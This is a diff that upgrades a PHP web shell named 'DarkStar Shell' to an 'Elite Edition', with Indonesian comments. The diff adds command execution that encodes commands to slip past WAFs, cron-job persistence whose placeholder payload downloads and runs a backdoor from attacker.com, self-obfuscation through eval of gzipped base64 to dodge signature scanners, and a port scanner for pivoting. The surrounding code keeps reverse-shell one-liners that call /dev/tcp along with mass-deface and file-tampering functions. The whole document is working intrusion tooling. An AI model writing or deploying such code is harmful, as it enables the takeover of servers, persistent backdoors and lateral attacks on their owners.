@@ -6,10 +6,10 @@ error_reporting(0);
 
 class DarkStarShell {
     // --- Configuration ---
-    private $panel_title = "DarkStar Shell v4.5 - Admin LTE (Base64/OOP)";
-    private $nick = "washere1337"; 
-    private $auth_user = "panel"; 
-    private $auth_pass = "panel";
+    private $panel_title = "DarkStar Shell v5.0 - Elite Edition";
+    private $nick = "3X0RC1ST"; 
+    private $auth_user = "elite"; // Ubah
+    private $auth_pass = "elite"; // Ubah
     
     // --- State & Path Variables ---
     private $shell_root;
@@ -17,6 +17,7 @@ class DarkStarShell {
     private $message = '';
     private $is_ajax = false;
     private $user_info = ['user' => 'N/A', 'uid' => 'N/A', 'group' => 'N/A', 'gid' => '?'];
+    private $self_file = __FILE__;
 
     public function __construct() {
         session_start();
@@ -48,6 +49,39 @@ class DarkStarShell {
         }
         return "Error: Command execution failed or disabled.";
     } 
+    
+    // BARU: Helper untuk eksekusi yang bisa di-bypass (WAF Bypass)
+    private function exe_bypass($cmd, $method, $target_func = 'system') {
+        $encoded_cmd = $cmd;
+        $decoded_cmd = $cmd;
+        
+        switch($method) {
+            case 'base64':
+                $encoded_cmd = base64_encode($cmd);
+                $decoded_cmd = "echo " . escapeshellarg($encoded_cmd) . " | base64 -d | sh";
+                break;
+            case 'hex':
+                $hex = bin2hex($cmd);
+                $decoded_cmd = "echo " . escapeshellarg($hex) . " | xxd -r -p | sh";
+                break;
+            case 'reverse':
+                $reversed = strrev($cmd);
+                $decoded_cmd = "echo " . escapeshellarg($reversed) . " | rev | sh";
+                break;
+            case 'plain':
+            default:
+                $decoded_cmd = $cmd;
+                break;
+        }
+
+        if(function_exists($target_func)) {
+             $output = $this->exe($decoded_cmd);
+             return "Executing: `{$decoded_cmd}`\nOutput:\n" . $output;
+        } else {
+             return "Error: Target function '{$target_func}' is disabled.";
+        }
+    }
+
 
     private function getPermColor($perms) {
         $perms = substr($perms, -4);
@@ -104,21 +138,15 @@ class DarkStarShell {
     
     private function handleAjax() {
         if (!$this->is_ajax) return;
-
+        // ... (Fungsi AJAX lainnya tetap sama: get_content, save_content, terminal) ...
         $action = $_GET['do'] ?? '';
         $target = $_REQUEST['target'] ?? '';
         
         switch($action) {
             case 'get_content':
                 if (ob_get_level() > 0) ob_clean(); 
-                
-                if(@is_readable($target) && is_file($target)) {
-                    $content = @file_get_contents($target);
-                    echo base64_encode($content); 
-                } else { 
-                    header('HTTP/1.1 404 Not Found'); 
-                    echo base64_encode("Error: File not found or unreadable."); 
-                }
+                if(@is_readable($target) && is_file($target)) { $content = @file_get_contents($target); echo base64_encode($content); } 
+                else { header('HTTP/1.1 404 Not Found'); echo base64_encode("Error: File not found or unreadable."); }
                 exit; 
             
             case 'save_content':
@@ -126,12 +154,8 @@ class DarkStarShell {
                 $encoded_content = $_POST['content'] ?? '';
                 $content = base64_decode($encoded_content); 
                 
-                if (@file_put_contents($target, $content) !== false) {
-                    echo 'Success: File saved successfully.';
-                } else { 
-                    header('HTTP/1.1 500 Internal Server Error'); 
-                    echo 'Error: Failed to save file. Check permissions.'; 
-                }
+                if (@file_put_contents($target, $content) !== false) { echo 'Success: File saved successfully.'; } 
+                else { header('HTTP/1.1 500 Internal Server Error'); echo 'Error: Failed to save file. Check permissions.'; }
                 exit;
                 
             case 'terminal':
@@ -139,12 +163,21 @@ class DarkStarShell {
                 $command = $_POST['command'] ?? '';
                 echo $this->exe($command);
                 exit;
+            
+            case 'advanced_exec': // BARU: WAF Bypass Execution
+                if (ob_get_level() > 0) ob_clean();
+                $command = $_POST['command'] ?? '';
+                $method = $_POST['method'] ?? 'plain';
+                $target_func = $_POST['target_func'] ?? 'system';
+                echo $this->exe_bypass($command, $method, $target_func);
+                exit;
 
             default:
                 exit;
         }
     }
 
+    // ... (handleSabunBiasa, handleReverseShell, handlePhpInfo, handleCompression, handleFindGrep tetap sama) ...
     private function handleSabunBiasa() {
         $namafile = $_POST['namafile'] ?? '';
         $isi_script = $_POST['isi_script'] ?? '';
@@ -153,28 +186,18 @@ class DarkStarShell {
         
         if (empty($namafile) || empty($isi_script)) {
             $this->message = "<div class='alert alert-danger'>Nama file dan Isi script tidak boleh kosong.</div>";
-            $this->redirectWithMsg();
-            return;
+            $this->redirectWithMsg(); return;
         }
 
         if(is_writable($dir)) {
             $dira = @scandir($dir);
-            if ($dira === false) {
-                 $this->message = "<div class='alert alert-danger'>Gagal membaca direktori: $dir</div>";
-                 $this->redirectWithMsg();
-                 return;
-            }
+            if ($dira === false) { $this->message = "<div class='alert alert-danger'>Gagal membaca direktori: $dir</div>"; $this->redirectWithMsg(); return; }
             foreach($dira as $dirb) {
                 $dirc = "$dir/$dirb";
-                if($dirb === '.') {
-                    $lokasi = $dir . '/' . $namafile;
-                    if (@file_put_contents($lokasi, $isi_script) !== false) $count++;
-                } elseif($dirb === '..') {
+                if($dirb === '.') { $lokasi = $dir . '/' . $namafile; if (@file_put_contents($lokasi, $isi_script) !== false) $count++; } 
+                elseif($dirb === '..') {
                     $parent_dir = dirname($dir);
-                    if ($parent_dir !== $dir) {
-                        $lokasi = $parent_dir . '/' . $namafile;
-                        if (@file_put_contents($lokasi, $isi_script) !== false) $count++;
-                    }
+                    if ($parent_dir !== $dir) { $lokasi = $parent_dir . '/' . $namafile; if (@file_put_contents($lokasi, $isi_script) !== false) $count++; }
                 } elseif(is_dir($dirc)) {
                     if(is_writable($dirc)) {
                         $lokasi = $dirc.'/'.$namafile;
@@ -193,11 +216,7 @@ class DarkStarShell {
         $ip = $_POST['rev_ip'] ?? '';
         $port = $_POST['rev_port'] ?? '';
 
-        if (empty($ip) || empty($port) || !is_numeric($port)) {
-            $this->message = "<div class='alert alert-danger'>IP dan Port tidak boleh kosong atau tidak valid.</div>";
-            $this->redirectWithMsg();
-            return;
-        }
+        if (empty($ip) || empty($port) || !is_numeric($port)) { $this->message = "<div class='alert alert-danger'>IP dan Port tidak boleh kosong atau tidak valid.</div>"; $this->redirectWithMsg(); return; }
 
         $shells = [
             "bash -i >& /dev/tcp/{$ip}/{$port} 0>&1",
@@ -208,18 +227,10 @@ class DarkStarShell {
         ];
         
         $success = false;
-        foreach ($shells as $cmd) {
-            $output = $this->exe($cmd);
-            if(empty($output) || strpos($output, 'command not found') === false) {
-                 $success = true;
-            }
-        }
+        foreach ($shells as $cmd) { $output = $this->exe($cmd); if(empty($output) || strpos($output, 'command not found') === false) { $success = true; } }
 
-        if ($success) {
-             $this->message = "<div class='alert alert-info'>Reverse Shell berhasil dieksekusi. Silakan cek listener Anda di <b>$ip:$port</b>.</div>";
-        } else {
-             $this->message = "<div class='alert alert-warning'>Reverse Shell dieksekusi, tetapi tidak ada koneksi yang terdeteksi atau semua perintah gagal dieksekusi.</div>";
-        }
+        if ($success) { $this->message = "<div class='alert alert-info'>Reverse Shell berhasil dieksekusi. Silakan cek listener Anda di <b>$ip:$port</b>.</div>"; } 
+        else { $this->message = "<div class='alert alert-warning'>Reverse Shell dieksekusi, tetapi tidak ada koneksi yang terdeteksi atau semua perintah gagal dieksekusi.</div>"; }
         $this->redirectWithMsg();
     }
     
@@ -238,35 +249,22 @@ class DarkStarShell {
         
         $target = rtrim($this->path, '/') . '/' . basename($item);
         
-        if (!file_exists($target)) {
-            $this->message = "<div class='alert alert-danger'>Target item '$item' not found.</div>";
-            $this->redirectWithMsg(); return;
-        }
+        if (!file_exists($target)) { $this->message = "<div class='alert alert-danger'>Target item '$item' not found.</div>"; $this->redirectWithMsg(); return; }
 
         if ($action == 'compress') {
             $output_path = rtrim($this->path, '/') . '/' . basename($output_name ?: (basename($item) . '.zip'));
-            if (is_dir($target)) {
-                $cmd = "zip -r " . escapeshellarg($output_path) . " " . escapeshellarg(basename($target));
-                $message_text = "Directory '{$item}' compressed to '{$output_path}'";
-            } elseif (is_file($target)) {
-                $cmd = "zip " . escapeshellarg($output_path) . " " . escapeshellarg(basename($target));
-                $message_text = "File '{$item}' compressed to '{$output_path}'";
-            }
+            if (is_dir($target)) { $cmd = "zip -r " . escapeshellarg($output_path) . " " . escapeshellarg(basename($target)); $message_text = "Directory '{$item}' compressed to '{$output_path}'"; } 
+            elseif (is_file($target)) { $cmd = "zip " . escapeshellarg($output_path) . " " . escapeshellarg(basename($target)); $message_text = "File '{$item}' compressed to '{$output_path}'"; }
         } elseif ($action == 'decompress') {
             $cmd = "unzip " . escapeshellarg($target) . " -d " . escapeshellarg($this->path);
             $message_text = "File '{$item}' decompressed successfully to current directory.";
-        } else {
-            $this->message = "<div class='alert alert-danger'>Invalid compression action.</div>";
-            $this->redirectWithMsg(); return;
-        }
+        } else { $this->message = "<div class='alert alert-danger'>Invalid compression action.</div>"; $this->redirectWithMsg(); return; }
 
         $output = $this->exe($cmd);
         
         if (strpos($output, 'command not found') !== false || strpos($output, 'sh: ') !== false) {
              $this->message = "<div class='alert alert-warning'>Compression failed: Zip/Unzip command not available or failed. Output: <pre>".htmlspecialchars($output)."</pre></div>";
-        } else {
-             $this->message = "<div class='alert alert-success'>$message_text</div>";
-        }
+        } else { $this->message = "<div class='alert alert-success'>$message_text</div>"; }
         $this->redirectWithMsg();
     }
     
@@ -276,21 +274,13 @@ class DarkStarShell {
         $dir = $_POST['search_dir'] ?? $this->path;
         $output = '';
 
-        if (empty($pattern)) {
-            $this->message = "<div class='alert alert-danger'>Search pattern cannot be empty.</div>";
-            $this->redirectWithMsg(); return;
-        }
+        if (empty($pattern)) { $this->message = "<div class='alert alert-danger'>Search pattern cannot be empty.</div>"; $this->redirectWithMsg(); return; }
         
         $pattern_esc = "'" . str_replace("'", "'\"'\"'", $pattern) . "'";
         $dir_esc = escapeshellarg($dir);
 
-        if ($search_type == 'file') {
-            $cmd = "find " . $dir_esc . " -name " . $pattern_esc;
-            $output_title = "Find Files matching '$pattern' in $dir";
-        } elseif ($search_type == 'content') {
-            $cmd = "grep -ril " . $pattern_esc . " " . $dir_esc . " 2>/dev/null"; 
-            $output_title = "Grep Content matching '$pattern' in $dir (Files only)";
-        }
+        if ($search_type == 'file') { $cmd = "find " . $dir_esc . " -name " . $pattern_esc; $output_title = "Find Files matching '$pattern' in $dir"; } 
+        elseif ($search_type == 'content') { $cmd = "grep -ril " . $pattern_esc . " " . $dir_esc . " 2>/dev/null"; $output_title = "Grep Content matching '$pattern' in $dir (Files only)"; }
         
         $output = $this->exe($cmd);
         
@@ -298,6 +288,94 @@ class DarkStarShell {
         $this->message = "<div class='alert alert-info'>Search executed. Check 'Find/Grep Results' tab.</div>";
         $this->redirectWithMsg();
     }
+    
+    // BARU: Persistence & Cron Job Manager
+    private function handlePersistence() {
+        $action = $_POST['persis_action'] ?? '';
+        $payload = $_POST['payload'] ?? '';
+        $schedule = $_POST['schedule'] ?? '* * * * *'; // Default every minute
+
+        if (strpos($this->exe('which crontab'), 'not found') !== false) {
+             $this->message = "<div class='alert alert-danger'>Crontab command not found on this system. Persistence failed.</div>";
+             $this->redirectWithMsg(); return;
+        }
+
+        if ($action == 'inject') {
+            if (empty($payload)) { $this->message = "<div class='alert alert-danger'>Payload cannot be empty.</div>"; $this->redirectWithMsg(); return; }
+            // Command for injecting: get current crontab, add new line, write back
+            $cron_entry = escapeshellarg("{$schedule} {$payload} #DS_PERSISTENCE_MARKER");
+            $cmd = "(crontab -l 2>/dev/null; echo {$cron_entry}) | crontab -";
+            $output = $this->exe($cmd);
+            $this->message = "<div class='alert alert-success'>Cron job injected successfully. Check the list below to verify. Output: <pre>".htmlspecialchars($output)."</pre></div>";
+        } elseif ($action == 'clear') {
+            // Remove lines with our marker
+            $cmd = "crontab -l | grep -v 'DS_PERSISTENCE_MARKER' | crontab -";
+            $output = $this->exe($cmd);
+            $this->message = "<div class='alert alert-success'>All DarkStar persistence entries cleared from crontab. Output: <pre>".htmlspecialchars($output)."</pre></div>";
+        }
+
+        $this->redirectWithMsg();
+    }
+    
+    // BARU: Polymorphic Self-Obfuscation (On-Demand)
+    private function handleSelfObfuscation() {
+        if (!is_writable($this->self_file)) {
+             $this->message = "<div class='alert alert-danger'>Error: File '{$this->self_file}' is not writable. Cannot obfuscate.</div>";
+             $this->redirectWithMsg(); return;
+        }
+
+        $source_code = @file_get_contents($this->self_file);
+        if ($source_code === false) {
+             $this->message = "<div class='alert alert-danger'>Error: Failed to read source file.</div>";
+             $this->redirectWithMsg(); return;
+        }
+        
+        $obfuscated_code = "<?php\n\n// DS_OBFUSCATED_MARKER\n\n";
+        $obfuscated_code .= "eval(gzinflate(base64_decode('" . base64_encode(gzdeflate($source_code)) . "')));\n\n?>";
+        
+        if (@file_put_contents($this->self_file, $obfuscated_code) !== false) {
+            $this->message = "<div class='alert alert-success'>Self-Obfuscation successful! The file signature has been changed. Reloading...</div>";
+        } else {
+             $this->message = "<div class='alert alert-danger'>Error: Failed to write obfuscated code back to file.</div>";
+        }
+        
+        $this->redirectWithMsg();
+    }
+
+    // BARU: Network Pivot - Port Scan
+    private function handlePortScan() {
+        $target_ip = $_POST['target_ip'] ?? '127.0.0.1';
+        $ports_str = $_POST['ports'] ?? '80,443,21,22,3306';
+        $timeout = (int)($_POST['timeout'] ?? 1);
+        $ports = array_map('trim', explode(',', $ports_str));
+        
+        $results = [];
+        $startTime = microtime(true);
+
+        foreach ($ports as $port) {
+            $port = (int)$port;
+            if ($port <= 0 || $port > 65535) continue;
+
+            $socket = @fsockopen($target_ip, $port, $errno, $errstr, $timeout);
+            
+            if ($socket) {
+                $results[] = "Port {$port} is OPEN (Service: ".@getservbyport($port, 'tcp').")";
+                @fclose($socket);
+            } else {
+                // $results[] = "Port {$port} is closed/filtered. ({$errstr})";
+            }
+        }
+        
+        $elapsed = round(microtime(true) - $startTime, 2);
+        
+        $output = "Scan completed in {$elapsed} seconds.\nTarget: {$target_ip}\n\n";
+        $output .= empty($results) ? "No open ports found or all ports are filtered." : implode("\n", $results);
+        
+        $_SESSION['network_results'] = ['title' => "Port Scan Results for {$target_ip}", 'output' => $output];
+        $this->message = "<div class='alert alert-info'>Port scan executed. Check 'Network Results' tab.</div>";
+        $this->redirectWithMsg();
+    }
+
     // ------------------------------------
 
     private function handlePostActions() {
@@ -320,9 +398,13 @@ class DarkStarShell {
         switch($action) {
             case 'sabun_biasa': $this->handleSabunBiasa(); break;
             case 'reverse_shell': $this->handleReverseShell(); break;
-            case 'compression': $this->handleCompression(); break; // <-- BARU
-            case 'find_grep': $this->handleFindGrep(); break; // <-- BARU
-            case 'phpinfo': $this->handlePhpInfo(); break; // <-- BARU
+            case 'compression': $this->handleCompression(); break; 
+            case 'find_grep': $this->handleFindGrep(); break;
+            case 'phpinfo': $this->handlePhpInfo(); break;
+            case 'persistence': $this->handlePersistence(); break; // BARU
+            case 'obfuscate_self': $this->handleSelfObfuscation(); break; // BARU
+            case 'port_scan': $this->handlePortScan(); break; // BARU
+            // ... (Kasus lainnya tetap sama: download, delete, rename, chmod, symlink, mass_delete, mass_deface, upload)
             case 'download':
                 if(@is_readable($target) && is_file($target)) {
                     if (ob_get_level() > 0) ob_clean();
@@ -385,6 +467,7 @@ class DarkStarShell {
         }
     }
     
+    // ... (recursiveDelete, recursiveDeface, redirectWithMsg tetap sama) ...
     private function redirectWithMsg() {
         if (ob_get_level() > 0) ob_clean();
         echo "<script>window.location.href = '?path=" . urlencode($this->path) . "&msg=" . urlencode(strip_tags($this->message)) . "';</script>";
@@ -415,7 +498,9 @@ class DarkStarShell {
         }
     }
 
+
     private function renderLogin() {
+        // ... (HTML Login Page tetap sama)
         header('HTTP/1.1 401 Unauthorized');
         echo '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
         <title>Login | Admin Shell</title>
@@ -446,6 +531,7 @@ class DarkStarShell {
         </body></html>';
     }
 
+    // ... (generateBreadcrumb, renderFileManager tetap sama) ...
     private function generateBreadcrumb() {
         $parts = explode('/', trim(str_replace($this->shell_root, '', $this->path), '/'));
         $output = '<nav aria-label="breadcrumb"><ol class="breadcrumb bg-gray-dark p-2 rounded-0">';
@@ -539,6 +625,29 @@ class DarkStarShell {
         <?php } 
         return ob_get_clean();
     }
+    
+    // BARU: Fungsi Run yang diupdate untuk Network Results
+    public function run() {
+        if (ob_get_level() == 0) ob_start(); 
+        
+        if (isset($_GET['clear_grep'])) {
+            unset($_SESSION['find_grep_results']);
+            header("Location: ?path=" . urlencode($this->path));
+            exit;
+        }
+        
+        if (isset($_GET['clear_network'])) { // BARU
+            unset($_SESSION['network_results']);
+            header("Location: ?path=" . urlencode($this->path));
+            exit;
+        }
+
+        $this->authenticate();
+        $this->handleAjax(); 
+        $this->handlePostActions();
+        $this->renderHTML();
+        if (ob_get_level() > 0) ob_end_flush();
+    }
 
     private function renderHTML() {
         $software = getenv("SERVER_SOFTWARE"); 
@@ -594,10 +703,14 @@ class DarkStarShell {
             <nav class="mt-2">
                 <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu">
                     <?php 
-                    $active_tab = isset($_SESSION['find_grep_results']) ? 'find_grep_results' : 'files';
+                    $active_tab = 'files';
+                    if (isset($_SESSION['find_grep_results'])) { $active_tab = 'find_grep_results'; } 
+                    if (isset($_SESSION['network_results'])) { $active_tab = 'network_results'; } 
                     ?>
                     <li class="nav-item"><a href="#files" class="nav-link <?php if($active_tab == 'files') echo 'active'; ?>" data-toggle="tab"><i class="nav-icon fas fa-folder-tree"></i><p>File Manager</p></a></li>
-                    <li class="nav-item"><a href="#terminal" class="nav-link" data-toggle="tab"><i class="nav-icon fas fa-terminal"></i><p>Terminal</p></a></li>
+                    <li class="nav-item"><a href="#terminal" class="nav-link" data-toggle="tab"><i class="nav-icon fas fa-terminal"></i><p>Terminal & Bypass</p></a></li>
+                    <li class="nav-item"><a href="#network" class="nav-link" data-toggle="tab"><i class="nav-icon fas fa-network-wired"></i><p>Network Pivot</p></a></li>
+                    <li class="nav-item"><a href="#persistence" class="nav-link" data-toggle="tab"><i class="nav-icon fas fa-shield-alt"></i><p>Persistence</p></a></li>
                     <li class="nav-item"><a href="#tools" class="nav-link" data-toggle="tab"><i class="nav-icon fas fa-tools"></i><p>Tools & Attacks</p></a></li>
                     <li class="nav-item"><a href="#system" class="nav-link" data-toggle="tab"><i class="nav-icon fas fa-tachometer-alt"></i><p>System Info</p></a></li>
                     <li class="nav-header">Quick Access</li>
@@ -608,16 +721,13 @@ class DarkStarShell {
                         </a>
                     </li>
                     <?php } ?>
+                    <?php if (isset($_SESSION['network_results'])) { // BARU ?>
                     <li class="nav-item">
-                        <a href="#" class="nav-link" onclick="editFile('<?php echo urlencode($this->path . '/wp-config.php'); ?>', 'wp-config.php')">
-                            <i class="nav-icon fas fa-file-invoice text-warning"></i><p>WP Config</p>
+                        <a href="#network_results" class="nav-link <?php if($active_tab == 'network_results') echo 'active'; ?>" data-toggle="tab">
+                            <i class="nav-icon fas fa-globe text-danger"></i><p>Network Results</p>
                         </a>
                     </li>
-                    <li class="nav-item">
-                        <a href="#" class="nav-link" onclick="showSymlinkModal('/etc/passwd', 'passwd.txt')">
-                            <i class="nav-icon fas fa-link text-danger"></i><p>Symlink /etc/passwd</p>
-                        </a>
-                    </li>
+                    <?php } ?>
                 </ul>
             </nav>
         </div>
@@ -657,7 +767,23 @@ class DarkStarShell {
                             </div>
                         </div>
                     </div>
-                    <?php } ?>
+                    <?php unset($_SESSION['find_grep_results']); } ?>
+                    
+                    <?php if (isset($_SESSION['network_results'])) { // BARU ?>
+                    <div class="tab-pane <?php if($active_tab == 'network_results') echo 'active'; ?>" id="network_results">
+                        <div class="card card-dark">
+                            <div class="card-header bg-danger">
+                                <h3 class="card-title"><i class="fas fa-globe"></i> <?php echo htmlspecialchars($_SESSION['network_results']['title']); ?></h3>
+                                <div class="card-tools">
+                                    <a href="?path=<?php echo $path_encoded; ?>&clear_network=1" class="btn btn-sm btn-light"><i class="fas fa-times"></i> Clear Results</a>
+                                </div>
+                            </div>
+                            <div class="card-body console">
+                                <pre><?php echo htmlspecialchars($_SESSION['network_results']['output']); ?></pre>
+                            </div>
+                        </div>
+                    </div>
+                    <?php unset($_SESSION['network_results']); } ?>
                     
                     <div class="tab-pane <?php if($active_tab == 'files') echo 'active'; ?>" id="files">
                         <div class="card card-dark">
@@ -693,44 +819,128 @@ class DarkStarShell {
                     
                     <div class="tab-pane" id="terminal">
                         <div class="card card-dark">
-                            <div class="card-header"><h3 class="card-title"><i class="fas fa-terminal"></i> Command Execution</h3></div>
+                            <div class="card-header bg-danger"><h3 class="card-title"><i class="fas fa-terminal"></i> Advanced Command Execution (WAF Bypass)</h3></div>
                             <div class="card-body console">
-                                <form id="terminalForm" onsubmit="return executeCommand(this)">
+                                <form id="advancedTerminalForm" onsubmit="return executeAdvancedCommand(this)">
+                                    <div class="row">
+                                        <div class="col-md-4">
+                                            <div class="form-group">
+                                                <label>Bypass Method (Encoding)</label>
+                                                <select class="form-control bg-dark text-light border-dark" name="method" id="execMethod">
+                                                    <option value="plain">1. Plain (system/exec)</option>
+                                                    <option value="base64">2. Base64 Pipe</option>
+                                                    <option value="hex">3. Hex Pipe</option>
+                                                    <option value="reverse">4. String Reverse Pipe</option>
+                                                </select>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-4">
+                                            <div class="form-group">
+                                                <label>Target PHP Function</label>
+                                                <select class="form-control bg-dark text-light border-dark" name="target_func" id="targetFunc">
+                                                    <option value="system">system()</option>
+                                                    <option value="passthru">passthru()</option>
+                                                    <option value="exec">exec()</option>
+                                                    <option value="shell_exec">shell_exec()</option>
+                                                </select>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-4">
+                                            <label class="text-danger">Status</label>
+                                            <p class="text-warning">Gunakan Base64/Hex untuk bypass WAF/IDS.</p>
+                                        </div>
+                                    </div>
                                     <div class="input-group mb-3">
                                         <div class="input-group-prepend"><span class="input-group-text bg-dark text-light border-dark" id="pathPrefix">$ <?php echo htmlspecialchars($this->path); ?> ></span></div>
-                                        <input type="text" class="form-control bg-dark text-light border-dark" name="command" id="commandInput" placeholder="Enter command (e.g., ls -la)" autocomplete="off" required>
-                                        <div class="input-group-append"><button class="btn btn-outline-success" type="submit">Execute</button></div>
+                                        <input type="text" class="form-control bg-dark text-light border-dark" name="command" id="commandInputAdvanced" placeholder="Enter command (e.g., id; pwd)" autocomplete="off" required>
+                                        <div class="input-group-append"><button class="btn btn-outline-danger" type="submit">Execute Bypass</button></div>
                                     </div>
                                     <input type="hidden" name="is_ajax" value="1">
                                 </form>
-                                <pre id="terminalOutput" style="min-height: 400px; max-height: 600px; overflow: auto; margin-top: 10px;"></pre>
+                                <pre id="terminalOutputAdvanced" style="min-height: 400px; max-height: 600px; overflow: auto; margin-top: 10px;"></pre>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="tab-pane" id="network">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <div class="card card-dark card-outline">
+                                    <div class="card-header bg-danger"><h3 class="card-title"><i class="fas fa-satellite-dish"></i> Network Pivot (Port Scanner)</h3></div>
+                                    <div class="card-body">
+                                        <p class="text-danger">Gunakan server ini sebagai titik *pivot* untuk memindai jaringan lokal/internal server.</p>
+                                        <form method="post" action="?do=port_scan&path=<?php echo $path_encoded; ?>">
+                                            <div class="form-group"><label>Target IP/Hostname</label><input type="text" class="form-control bg-dark text-light" name="target_ip" value="127.0.0.1" required></div>
+                                            <div class="form-group"><label>Ports to Scan (Comma separated)</label><input type="text" class="form-control bg-dark text-light" name="ports" value="21,22,80,443,3306,8080" required></div>
+                                            <div class="form-group"><label>Timeout per Port (seconds)</label><input type="number" class="form-control bg-dark text-light" name="timeout" value="1" min="0.1" step="0.1" required></div>
+                                            <button type="submit" class="btn btn-danger btn-block">Start Port Scan (PHP fsockopen)</button>
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="card card-dark card-outline">
+                                    <div class="card-header bg-info"><h3 class="card-title"><i class="fas fa-link"></i> SOCKS Proxy & Exfiltration Status</h3></div>
+                                    <div class="card-body">
+                                        <p class="text-info">Modul SOCKS/Exfiltration membutuhkan kode PHP yang berbeda. Lakukan Port Scan dahulu untuk mengidentifikasi target *pivoting*.</p>
+                                        <ul>
+                                            <li>**SOCKS Proxy:** Perlu mengunggah script SOCKS terpisah (misalnya, `s.php`) dan menjalankan *port forwarding* dari lokal Anda.</li>
+                                            <li>**Exfiltration Tunnel (DNS/ICMP):** Membutuhkan domain C2 eksternal dan server di luar (tidak dapat diimplementasikan sepenuhnya dalam *webshell* satu file).</li>
+                                        </ul>
+                                        <p class="text-warning">Status: **Port Scanning** aktif. Status SOCKS/Exfiltration: **Manual**. </p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="tab-pane" id="persistence">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <div class="card card-dark card-outline">
+                                    <div class="card-header bg-success"><h3 class="card-title"><i class="fas fa-calendar-alt"></i> Persistence: Cron Job Manager</h3></div>
+                                    <div class="card-body">
+                                        <p class="text-success">Injeksi perintah ke crontab Linux untuk akses yang berkelanjutan (self-healing backdoor/reverse shell).</p>
+                                        <form method="post" action="?do=persistence&path=<?php echo $path_encoded; ?>">
+                                            <input type="hidden" name="persis_action" value="inject">
+                                            <div class="form-group"><label>Cron Schedule (e.g., `* * * * *` untuk setiap menit)</label><input type="text" class="form-control bg-dark text-light" name="schedule" value="* * * * *" required></div>
+                                            <div class="form-group"><label>Payload Command</label><textarea class="form-control bg-dark text-light" name="payload" rows="4" placeholder="e.g., curl http://attacker.com/backdoor.php -o /tmp/b.php; php /tmp/b.php" required></textarea></div>
+                                            <button type="submit" class="btn btn-success btn-block" onclick="return confirm('WARNING: Yakin untuk inject cron job? Ini akan meninggalkan jejak di crontab.')">Inject Cron Job</button>
+                                        </form>
+                                        <hr>
+                                        <form method="post" action="?do=persistence&path=<?php echo $path_encoded; ?>">
+                                            <input type="hidden" name="persis_action" value="clear">
+                                            <button type="submit" class="btn btn-danger btn-block" onclick="return confirm('WARNING: Yakin untuk menghapus SEMUA persistence marker DarkStar?')">Clear All Persistence</button>
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="card card-dark card-outline">
+                                    <div class="card-header bg-warning"><h3 class="card-title"><i class="fas fa-list-alt"></i> Current Crontab</h3></div>
+                                    <div class="card-body console">
+                                        <pre><?php echo htmlspecialchars($this->exe('crontab -l 2>/dev/null') ?: 'Crontab is empty or inaccessible.'); ?></pre>
+                                    </div>
+                                </div>
                             </div>
                         </div>
                     </div>
 
                     <div class="tab-pane" id="tools">
                         <div class="row">
-                            
                             <div class="col-md-4">
                                 <div class="card card-dark card-outline">
-                                    <div class="card-header bg-secondary"><h3 class="card-title"><i class="fas fa-search"></i> Find File & Grep Content</h3></div>
+                                    <div class="card-header bg-secondary"><h3 class="card-title"><i class="fas fa-mask"></i> Polymorphic Self-Obfuscation</h3></div>
                                     <div class="card-body">
-                                        <p class="text-secondary">Cari file berdasarkan nama atau teks di dalam file.</p>
-                                        <form method="post" action="?do=find_grep&path=<?php echo $path_encoded; ?>">
-                                            <div class="form-group"><label>Search Type</label>
-                                                <select class="form-control bg-dark text-light" name="search_type" required>
-                                                    <option value="file">Find File (by name, e.g., *.php)</option>
-                                                    <option value="content">Grep Content (by text, e.g., password)</option>
-                                                </select>
-                                            </div>
-                                            <div class="form-group"><label>Pattern</label><input type="text" class="form-control bg-dark text-light" name="search_pattern" placeholder="e.g., *config* atau admin_pass" required></div>
-                                            <div class="form-group"><label>Directory Start</label><input type="text" class="form-control bg-dark text-light" name="search_dir" value="<?php echo htmlspecialchars($this->path); ?>" required></div>
-                                            <button type="submit" class="btn btn-secondary btn-block">Search</button>
+                                        <p class="text-secondary">Enkripsi diri sendiri (GZIP + Base64) untuk menghindari deteksi berbasis *signature*.</p>
+                                        <p class="text-warning">**PERINGATAN:** Ini akan menulis ulang kode file ini! Pastikan file ini *writable*.</p>
+                                        <form method="post" action="?do=obfuscate_self&path=<?php echo $path_encoded; ?>">
+                                            <div class="form-group"><label>Shell File Path</label><input type="text" class="form-control bg-dark text-light" value="<?php echo htmlspecialchars($this->self_file); ?>" readonly></div>
+                                            <button type="submit" class="btn btn-secondary btn-block" onclick="return confirm('WARNING: Are you sure you want to OBUSCATE this file? Reload is required.')">Run Self-Obfuscation</button>
                                         </form>
                                     </div>
                                 </div>
                             </div>
-
                             <div class="col-md-4">
                                 <div class="card card-dark card-outline">
                                     <div class="card-header bg-info"><h3 class="card-title"><i class="fas fa-archive"></i> Compression (Zip/Unzip)</h3></div>
@@ -750,7 +960,25 @@ class DarkStarShell {
                                     </div>
                                 </div>
                             </div>
-                            
+                            <div class="col-md-4">
+                                <div class="card card-dark card-outline">
+                                    <div class="card-header bg-secondary"><h3 class="card-title"><i class="fas fa-search"></i> Find File & Grep Content</h3></div>
+                                    <div class="card-body">
+                                        <p class="text-secondary">Cari file berdasarkan nama atau teks di dalam file.</p>
+                                        <form method="post" action="?do=find_grep&path=<?php echo $path_encoded; ?>">
+                                            <div class="form-group"><label>Search Type</label>
+                                                <select class="form-control bg-dark text-light" name="search_type" required>
+                                                    <option value="file">Find File (by name, e.g., *.php)</option>
+                                                    <option value="content">Grep Content (by text, e.g., password)</option>
+                                                </select>
+                                            </div>
+                                            <div class="form-group"><label>Pattern</label><input type="text" class="form-control bg-dark text-light" name="search_pattern" placeholder="e.g., *config* atau admin_pass" required></div>
+                                            <div class="form-group"><label>Directory Start</label><input type="text" class="form-control bg-dark text-light" name="search_dir" value="<?php echo htmlspecialchars($this->path); ?>" required></div>
+                                            <button type="submit" class="btn btn-secondary btn-block">Search</button>
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
